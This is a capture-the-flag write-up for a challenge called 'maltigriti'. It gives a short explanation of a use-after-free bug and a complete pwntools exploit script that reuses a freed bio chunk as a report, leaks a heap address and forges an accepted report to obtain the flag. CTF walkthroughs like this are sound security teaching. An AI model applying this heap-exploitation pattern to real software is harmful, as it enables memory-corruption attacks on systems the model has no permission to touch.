[COMMUNITY SOLUTION](https://youtu.be/uap9G10a8UE?t=878)

TLDR; Use-After-Free in user->bio. Get the `user->bio` and a `report` to point to the same chunk and then modify the report/bio to be an accepted report.

```py
import pwn
import time
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

elf = pwn.ELF("./maltigriti")
pwn.context.binary = elf
pwn.context.log_level = "DEBUG"
pwn.context(terminal=['tmux', 'split-window', '-h'])

libc = elf.libc
p = elf.process()
# p = pwn.remote("localhost", "1024")

# 1. UAF
p.sendlineafter("menu> ", "0") # register user
p.sendlineafter("name> ", "SJP")
p.sendlineafter("password>", "SJP")
p.sendlineafter("bio>", "192") # size of report
p.sendlineafter("bio>", "hi")
p.sendlineafter("menu> ", "6") # logout

# 2. Create report (using same chunk as bio)
p.sendlineafter("menu> ", "2") # create report
p.sendlineafter("title> ", "title")
p.sendlineafter("report> ", "body")

# 3. Edit User Bio to modify report (leak user_addr first)
p.sendlineafter("menu> ", "1")
p.recvuntil("is: ")
user_leak = pwn.u64(p.recv(6).ljust(8, b"\x00"))
print(f"{hex(user_leak)=}")
p.sendlineafter("bio>", pwn.p64(user_leak) + pwn.p64(ord('A')) + pwn.p64(2000))

# 4. Print Flag
p.sendlineafter("menu>", "5")

p.interactive()
```
